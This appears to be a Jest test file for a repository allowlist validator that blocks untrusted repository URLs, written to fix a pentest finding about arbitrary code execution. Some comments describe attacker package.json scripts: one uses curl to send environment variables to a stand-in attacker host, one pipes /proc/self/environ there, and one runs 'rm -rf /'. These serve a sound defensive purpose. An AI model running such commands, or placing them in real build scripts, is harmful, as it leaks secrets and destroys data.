/**
 * Repository Validator Security Tests
 * 
 * Tests for the repository validation security feature that prevents
 * execution of untrusted repository code in workflows.
 * 
 * SECURITY CONTEXT:
 * These tests verify the mitigation for the pentest finding:
 * "Authenticated callers can execute untrusted repository code in the coordinator trust zone"
 * 
 * The vulnerability allowed authenticated users to supply arbitrary repository URLs
 * that would be cloned and executed (npm ci, npm test, npm run build) without
 * authorization checks, leading to arbitrary code execution in the coordinator trust zone.
 */

const assert = require('assert');

// Mock environment for testing
process.env.TRUSTED_REPOSITORY_PATTERNS = 'https://github.com/trusted-org/*,https://gitlab.com/secure-group/specific-repo';

// Import after setting environment
const repositoryValidator = require('../../api-server/server/lib/repository-validator');

describe('Repository Validator Security', () => {
  describe('validateRepository', () => {
    test('should accept trusted GitHub organization repositories', () => {
      const result = repositoryValidator.validateRepository('https://github.com/trusted-org/my-repo');
      expect(result.valid).toBe(true);
    });

    test('should accept trusted GitHub organization repositories with .git suffix', () => {
      const result = repositoryValidator.validateRepository('https://github.com/trusted-org/my-repo.git');
      expect(result.valid).toBe(true);
    });

    test('should accept SSH format URLs from trusted sources', () => {
      const result = repositoryValidator.validateRepository('git@github.com:trusted-org/my-repo.git');
      expect(result.valid).toBe(true);
    });

    test('should accept git:// protocol URLs from trusted sources', () => {
      const result = repositoryValidator.validateRepository('git://github.com/trusted-org/my-repo');
      expect(result.valid).toBe(true);
    });

    test('should accept specific trusted repository', () => {
      const result = repositoryValidator.validateRepository('https://gitlab.com/secure-group/specific-repo');
      expect(result.valid).toBe(true);
    });

    test('should reject untrusted GitHub repositories', () => {
      const result = repositoryValidator.validateRepository('https://github.com/untrusted-org/malicious-repo');
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('not from a trusted source');
    });

    test('should reject untrusted GitLab repositories', () => {
      const result = repositoryValidator.validateRepository('https://gitlab.com/attacker/evil-repo');
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('not from a trusted source');
    });

    test('should reject invalid URL formats', () => {
      const result = repositoryValidator.validateRepository('not-a-valid-url');
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('Invalid repository URL format');
    });

    test('should reject empty or null URLs', () => {
      const result1 = repositoryValidator.validateRepository('');
      expect(result1.valid).toBe(false);
      
      const result2 = repositoryValidator.validateRepository(null);
      expect(result2.valid).toBe(false);
    });
  });

  describe('validateWorkflowInputs', () => {
    test('should accept inputs with trusted repository URLs', () => {
      const inputs = {
        repository_url: 'https://github.com/trusted-org/my-repo',
        branch: 'main',
        other_param: 'value'
      };
      const result = repositoryValidator.validateWorkflowInputs(inputs);
      expect(result.valid).toBe(true);
    });

    test('should reject inputs with untrusted repository URLs', () => {
      const inputs = {
        repository_url: 'https://github.com/attacker/malicious-repo',
        branch: 'main'
      };
      const result = repositoryValidator.validateWorkflowInputs(inputs);
      expect(result.valid).toBe(false);
      expect(result.invalidFields.length).toBeGreaterThan(0);
      expect(result.invalidFields[0].field).toBe('repository_url');
    });

    test('should check multiple repository field names', () => {
      const inputs = {
        repo_url: 'https://github.com/trusted-org/repo1',
        source_repository: 'https://github.com/attacker/evil-repo'
      };
      const result = repositoryValidator.validateWorkflowInputs(inputs);
      expect(result.valid).toBe(false);
      expect(result.invalidFields.some(f => f.field === 'source_repository')).toBe(true);
    });

    test('should accept inputs without repository URLs', () => {
      const inputs = {
        branch: 'main',
        environment: 'production',
        skip_tests: false
      };
      const result = repositoryValidator.validateWorkflowInputs(inputs);
      expect(result.valid).toBe(true);
    });

    test('should handle empty inputs object', () => {
      const result = repositoryValidator.validateWorkflowInputs({});
      expect(result.valid).toBe(true);
    });

    test('should handle null inputs', () => {
      const result = repositoryValidator.validateWorkflowInputs(null);
      expect(result.valid).toBe(true);
    });
  });

  describe('URL normalization', () => {
    test('should normalize HTTPS URLs consistently', () => {
      const urls = [
        'https://github.com/trusted-org/repo',
        'https://github.com/trusted-org/repo.git',
        'git@github.com:trusted-org/repo.git',
        'git://github.com/trusted-org/repo'
      ];

      const results = urls.map(url => repositoryValidator.validateRepository(url));
      expect(results.every(r => r.valid === true)).toBe(true);
    });
  });

  // ============================================================================
  // SECURITY EXPLOIT SCENARIO TESTS
  // These tests directly verify that the pentest exploit scenarios are blocked
  // ============================================================================

  describe('Pentest Exploit Scenarios - Mitigation Verification', () => {
    describe('Scenario: Attacker-controlled repository with malicious package.json', () => {
      test('should block execution of attacker repository with malicious npm lifecycle hooks', () => {
        // EXPLOIT: Attacker supplies repository with package.json containing:
        // "scripts": { "preinstall": "curl http://attacker.com/exfil?data=$(env)" }
        const maliciousInputs = {
          repository_url: 'https://github.com/attacker/malicious-npm-hooks',
          branch: 'main',
          deploy_env: 'production'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Validation must fail
        expect(result.valid).toBe(false);
        expect(result.invalidFields.length).toBeGreaterThan(0);
        expect(result.invalidFields[0].field).toBe('repository_url');
        expect(result.reason).toContain('Untrusted repository');
      });

      test('should block execution of attacker repository with malicious test scripts', () => {
        // EXPLOIT: Attacker supplies repository with package.json containing:
        // "scripts": { "test": "node -e \"require('child_process').exec('rm -rf /')\"" }
        const maliciousInputs = {
          repository_url: 'https://github.com/evil-actor/destructive-tests',
          branch: 'exploit',
          deploy_env: 'staging'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Must reject before any cloning or execution
        expect(result.valid).toBe(false);
        expect(result.invalidFields.some(f => f.field === 'repository_url')).toBe(true);
      });

      test('should block execution of attacker repository with malicious build scripts', () => {
        // EXPLOIT: Attacker supplies repository with package.json containing:
        // "scripts": { "build": "bash -c 'cat /proc/self/environ | curl -X POST -d @- http://attacker.com'" }
        const maliciousInputs = {
          repository_url: 'https://gitlab.com/attacker-group/exfiltration-build',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Validation blocks execution at entry point
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('Untrusted repository');
      });
    });

    describe('Scenario: Attacker-controlled repository with malicious requirements.txt', () => {
      test('should block execution of attacker Python repository with malicious dependencies', () => {
        // EXPLOIT: Attacker supplies repository with requirements.txt containing:
        // malicious-package==1.0.0  # Package with setup.py that executes arbitrary code
        const maliciousInputs = {
          repository_url: 'https://github.com/attacker/python-backdoor',
          branch: 'main',
          deploy_env: 'production'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Python repositories also blocked
        expect(result.valid).toBe(false);
        expect(result.invalidFields[0].value).toContain('attacker');
      });
    });

    describe('Scenario: URL obfuscation attempts', () => {
      test('should block attacker repository with URL encoding attempts', () => {
        // EXPLOIT: Attacker tries to bypass validation with URL encoding
        const maliciousInputs = {
          repository_url: 'https://github.com/attacker%2Fmalicious-repo',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: URL normalization prevents bypass
        expect(result.valid).toBe(false);
      });

      test('should block attacker repository with different protocol schemes', () => {
        // EXPLOIT: Attacker tries SSH format to bypass HTTPS validation
        const maliciousInputs = {
          repository_url: 'git@github.com:attacker/evil-repo.git',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: All URL formats normalized and validated
        expect(result.valid).toBe(false);
      });

      test('should block attacker repository with git:// protocol', () => {
        // EXPLOIT: Attacker tries git:// protocol
        const maliciousInputs = {
          repository_url: 'git://github.com/attacker/malicious-code',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: git:// protocol also validated
        expect(result.valid).toBe(false);
      });
    });

    describe('Scenario: Subdomain and path traversal attempts', () => {
      test('should block attacker repository on different subdomain', () => {
        // EXPLOIT: Attacker tries to use attacker-controlled subdomain
        const maliciousInputs = {
          repository_url: 'https://evil.github.com/trusted-org/fake-repo',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Hostname must match exactly
        expect(result.valid).toBe(false);
      });

      test('should block repository with path traversal in organization name', () => {
        // EXPLOIT: Attacker tries path traversal in org name
        const maliciousInputs = {
          repository_url: 'https://github.com/trusted-org/../attacker/evil-repo',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: Path traversal blocked
        expect(result.valid).toBe(false);
      });
    });

    describe('Scenario: Multiple repository fields with mixed trust', () => {
      test('should block workflow if any repository field is untrusted', () => {
        // EXPLOIT: Attacker supplies one trusted and one untrusted repo
        const maliciousInputs = {
          repository_url: 'https://github.com/trusted-org/good-repo',
          source_repository: 'https://github.com/attacker/malicious-source',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
        
        // SECURITY ASSERTION: All repository fields must be trusted
        expect(result.valid).toBe(false);
        expect(result.invalidFields.some(f => f.field === 'source_repository')).toBe(true);
        expect(result.invalidFields.every(f => f.value.includes('attacker'))).toBe(true);
      });
    });

    describe('Scenario: Empty or missing TRUSTED_REPOSITORY_PATTERNS', () => {
      test('should deny all repositories when no patterns configured', () => {
        // Temporarily clear patterns to test fail-secure behavior
        const originalPatterns = process.env.TRUSTED_REPOSITORY_PATTERNS;
        delete process.env.TRUSTED_REPOSITORY_PATTERNS;
        
        // Force reload of validator with empty patterns
        delete require.cache[require.resolve('../../api-server/server/lib/repository-validator')];
        const validatorNoPatterns = require('../../api-server/server/lib/repository-validator');
        
        const inputs = {
          repository_url: 'https://github.com/any-org/any-repo',
          branch: 'main'
        };

        const result = validatorNoPatterns.validateWorkflowInputs(inputs);
        
        // SECURITY ASSERTION: Fail-secure - deny all when not configured
        expect(result.valid).toBe(false);
        
        // Restore original patterns
        process.env.TRUSTED_REPOSITORY_PATTERNS = originalPatterns;
        delete require.cache[require.resolve('../../api-server/server/lib/repository-validator')];
        require('../../api-server/server/lib/repository-validator');
      });
    });
  });

  // ============================================================================
  // DEFENSE IN DEPTH TESTS
  // Verify that validation is comprehensive and cannot be bypassed
  // ============================================================================

  describe('Defense in Depth - Comprehensive Validation', () => {
    test('should validate all common repository field names', () => {
      const fieldNames = [
        'repository_url',
        'repository',
        'repo_url',
        'repo',
        'git_url',
        'source_repository',
        'source_repo'
      ];

      fieldNames.forEach(fieldName => {
        const inputs = {
          [fieldName]: 'https://github.com/attacker/evil-repo',
          branch: 'main'
        };

        const result = repositoryValidator.validateWorkflowInputs(inputs);
        
        // SECURITY ASSERTION: All field names must be validated
        expect(result.valid).toBe(false);
        expect(result.invalidFields.some(f => f.field === fieldName)).toBe(true);
      });
    });

    test('should provide detailed error information for security auditing', () => {
      const maliciousInputs = {
        repository_url: 'https://github.com/attacker/malicious-repo',
        branch: 'main'
      };

      const result = repositoryValidator.validateWorkflowInputs(maliciousInputs);
      
      // SECURITY ASSERTION: Error details support security monitoring
      expect(result.valid).toBe(false);
      expect(result.reason).toBeDefined();
      expect(result.invalidFields).toBeDefined();
      expect(result.invalidFields[0].field).toBeDefined();
      expect(result.invalidFields[0].value).toBeDefined();
      expect(result.invalidFields[0].reason).toBeDefined();
    });

    test('should handle case-insensitive pattern matching', () => {
      // Test that pattern matching is case-insensitive for URLs
      const inputs = {
        repository_url: 'https://GITHUB.COM/TRUSTED-ORG/MY-REPO',
        branch: 'main'
      };

      const result = repositoryValidator.validateWorkflowInputs(inputs);
      
      // SECURITY ASSERTION: Case variations should not bypass validation
      expect(result.valid).toBe(true);
    });

    test('should reject non-string repository URLs', () => {
      const inputs = {
        repository_url: { url: 'https://github.com/attacker/evil-repo' },
        branch: 'main'
      };

      const result = repositoryValidator.validateWorkflowInputs(inputs);
      
      // SECURITY ASSERTION: Type validation prevents object injection
      expect(result.valid).toBe(false);
    });
  });

  // ============================================================================
  // POSITIVE SECURITY TESTS
  // Verify that legitimate use cases still work
  // ============================================================================

  describe('Positive Security - Legitimate Use Cases', () => {
    test('should allow conditional-deploy workflow with trusted repository', () => {
      // LEGITIMATE USE: Deploying from trusted organization repository
      const legitimateInputs = {
        repository_url: 'https://github.com/trusted-org/production-app',
        branch: 'main',
        deploy_env: 'production',
        skip_tests: false
      };

      const result = repositoryValidator.validateWorkflowInputs(legitimateInputs);
      
      expect(result.valid).toBe(true);
    });

    test('should allow workflows with multiple trusted repositories', () => {
      // LEGITIMATE USE: Workflow using multiple trusted sources
      const legitimateInputs = {
        repository_url: 'https://github.com/trusted-org/app',
        source_repository: 'https://github.com/trusted-org/library',
        branch: 'main'
      };

      const result = repositoryValidator.validateWorkflowInputs(legitimateInputs);
      
      expect(result.valid).toBe(true);
    });

    test('should allow workflows without repository inputs', () => {
      // LEGITIMATE USE: Workflow that doesn't use repositories
      const legitimateInputs = {
        environment: 'production',
        version: '1.2.3',
        rollback: false
      };

      const result = repositoryValidator.validateWorkflowInputs(legitimateInputs);
      
      expect(result.valid).toBe(true);
    });
  });
});
